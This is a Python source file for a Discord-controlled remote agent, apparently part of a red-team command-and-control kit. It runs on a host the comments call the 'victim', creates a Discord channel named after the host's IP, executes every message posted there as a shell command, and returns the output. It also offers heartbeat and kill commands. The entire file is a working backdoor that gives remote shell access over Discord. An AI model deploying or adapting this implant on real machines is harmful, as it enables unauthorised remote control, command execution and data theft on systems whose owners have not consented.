import asyncio
import os
import socket
import shlex
from subprocess import Popen, PIPE
from time import time

import discord
from discord.ext import commands
from discordChannel import discordChannel

"""
Uses py-cord discord bot for communication with a command server. This is a minion or remote instance.
It runs on an in-scope machine and runs commands. It it intended to be pretty bare bones and have most of the quality of
life features provided by the Command instance. (See Command.py)

Author: Asa Horn
"""

bot = commands.Bot(command_prefix='@REM ')
client = discord.Client()  #client represents the bot "user" profile
channel = discordChannel()  #channel is my own object for storing things related to the channel the bot will create.
channel.IP = socket.gethostbyname(socket.gethostname())  #get the IP of the victim for IDing it.


@client.event
async def on_ready():
    #todo make work with multiple servers?
    #not really sure if that is worth the effort, seems like it would be confusing to use if it was in multiple servers.
    hostServer = client.guilds[0]  # Get the server I am in

    print('Using py-cord v' + discord.__version__)
    print('Login success, I am ' + channel.IP + ' command server is guild "' + hostServer.name + '"')
    channel.ID = await hostServer.create_text_channel(channel.IP.replace('.', '-'))  #make the command channel
    await cutAndSendGreen("New remote @ " + channel.IP)  #wake up commander and say hello to humans
    await channel.ID.send('!addChannel')
    print('Init completed awaiting commands.')


@client.event
async def on_message(ctx):
    cmd = ctx.content

    if cmd[0:5] == '@REM ':
        if cmd == '@REM heartBeat':
            await heartBeat(ctx)
        elif cmd == '@REM kill':
            await kill(ctx)

    # ignore messages which are not in my command channel
    if ctx.channel != channel.ID:
        return

    # ignore messages which start with # or ! or @
    if cmd[0] == "`" or cmd[0] == '!' or cmd[0] == '@':
        return

    print('USR CMD: ' + cmd)
    ##################################################directory services
    dirChangedFlag = False
    lastDir = channel.currentDir
    if cmd[0:2] == 'cd':
        if ':' in cmd:  # if a drive is specified then don't fuck with it
            channel.currentDir = cmd[3:]  #set the dir to whatever is after 'cd '
        else:
            if channel.currentDir.rfind('/') == -1:
                print('Error: no / in directory string...')
            if cmd[2:] == '..' or cmd[3:] == '..':  # handle cd.. or cd ..
                channel.currentDir = channel.currentDir[0: channel.currentDir.rfind('/')]
            elif cmd[3] == '/':  # handle cd /etc/....
                channel.currentDir = cmd[3:]
            else:  # if nothing else this is a command to dive deeper into the current directory
                if not (channel.currentDir[-1] == '/' or channel.currentDir[-1] == '\\'):
                    channel.currentDir += '/'  # if there is no / or \ on the end of the channel.currentDir then add one before continuing
                channel.currentDir += cmd[3:]
        cmd = 'echo testDir'  # if we changed the directory then test it is valid
        dirChangedFlag = True

    ##################################################execute
    print('in directory: ', channel.currentDir)
    try:
        command = shlex.split(cmd)
        process = Popen(command, cwd=channel.currentDir, shell=True, stdout=PIPE, stderr=PIPE)
        stdout, stderr = process.communicate()
        stdout = stdout.decode("utf-8")
        stderr = stderr.decode("utf-8")
    except OSError:  #catch no such dir errors.
        await cutAndSendYellow('The specified directory does not exist')
        channel.currentDir = lastDir  #revert directory change if it didn't work
        return

    ##################################################discord output
    print('----returns----')
    print(stdout)
    print(stderr)

    if dirChangedFlag:  #don't show the user the results of my test echo to see if the directory exists
        await cutAndSend('Changed directory to ' + channel.currentDir)
    else:
        if not stderr and not stdout:
            await cutAndSend('okay.')
        elif not stderr:
            await cutAndSend(stdout)
        elif not stdout:
            await cutAndSendYellow(stderr)
        else:
            await cutAndSend(stdout)
            await cutAndSendYellow(stderr)


async def cutAndSend(content, frontDecor='```', backDecor='```', maxMsg=4):
    """
    handle the 2000 character per message limit discord imposes on bots.
    """
    maxChars = 2000
    maxContentPerMsg = maxChars-len(frontDecor)-len(backDecor)
    if len(content) <= maxContentPerMsg:  #if I can send as one message then send it.
        await channel.ID.send(frontDecor + content + backDecor)
    elif len(content) <= maxContentPerMsg * maxMsg:  #I can send as a series of messages
        await channel.ID.send(frontDecor + content[:maxContentPerMsg] + backDecor)
        await cutAndSend(content[maxContentPerMsg:])
    else:  #If I need more than 4 messages to send the result send it as a txt file
        with open("result.txt", "w+") as file:
            file.write(content)

        with open('result.txt', 'rb') as file:
            await channel.ID.send("```Output is too chonkey to send in a message:```",
                                  file=discord.File(file, "result.txt"))

        os.remove('result.txt')

async def cutAndSendYellow(content, maxMsg=4):
    await cutAndSend(content, '```fix\n', '```', maxMsg)

async def cutAndSendGreen(content, maxMsg=4):
    await cutAndSend(content, '```bash\n"', '"```', maxMsg)

async def cutAndSendSimple(content, maxMsg=4):
    await cutAndSend(content, '`', '', maxMsg)

################################################################################Bot commands
#used for changing things about how this remote behaves and managing it

async def heartBeat(ctx):
    print('Controller heartbeat at time ' + str(time()))
    await ctx.channel.send('!buBum')
    await ctx.delete()

async def kill(ctx):
    ctx.channel.send('Killing remote @ ' + channel.IP)
    exit(0)

#################################################################################
def main(args):
    with open('secrets.txt') as f:
        secret = f.read()
        #os.remove('secrets.txt') #not the most secure but better than nothing
        client.run(secret)


if __name__ == '__main__':
    main('')
